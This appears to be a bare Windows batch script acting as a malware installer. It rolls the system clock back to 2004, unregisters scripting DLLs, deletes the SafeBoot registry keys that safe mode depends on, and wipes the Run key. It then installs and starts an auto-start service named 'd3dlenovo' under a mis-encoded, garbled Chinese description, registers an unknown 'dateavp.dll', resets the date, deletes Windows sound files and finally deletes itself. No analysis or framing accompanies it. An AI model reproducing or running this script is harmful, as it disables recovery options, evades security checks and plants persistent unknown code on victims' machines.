date 2004-08-17
time 20:00:00.00
ping 127.0.0.1 -n 3
regsvr32.exe /u /s scrrun.dll
regsvr32.exe /u /s shimgvw.dll
regsvr32.exe /u /s itss.dll
regsvr32.exe /u /s vbscript.dll
regsvr32.exe /s jscript.dll
reg.exe delete HKLM\SYSTEM\ControlSet001\Control\SafeBoot\Minimal\{4D36E967-E325-11CE-BFC1-08002BE10318} /f
reg.exe delete HKLM\SYSTEM\ControlSet001\Control\SafeBoot\Network\{4D36E967-E325-11CE-BFC1-08002BE10318} /f
reg.exe delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E967-E325-11CE-BFC1-08002BE10318} /f
reg.exe delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E967-E325-11CE-BFC1-08002BE10318} /f
reg.exe delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f
sc.exe create d3dlenovo BinPath= "C:\WINNT\system32\d3dlenovo.exe" type= own type= interact start= auto DisplayName= d3dlenovo
sc.exe description d3dlenovo  �ṩ�����ַת����Ѱַ�����ƽ�����/�����ֱ�������ע��֪ͨ��
ping 127.0.0.1 -n 5
date 2007-12-13
time 13:22:25
sc.exe start d3dlenovo
regsvr32.exe /s C:\WINNT\system32\dateavp.dll
regsvr32.exe /s C:\WINNT\system32\dateavp.dll
del "C:\WINDOWS\Media\Windows XP ��ʼ.wav"
del "C:\WINDOWS\Media\Windows XP ��Ϣ��.wav"
del "C:\WINDOWS\Media\Windows XP ������������ֹ.wav"
del %0
exit
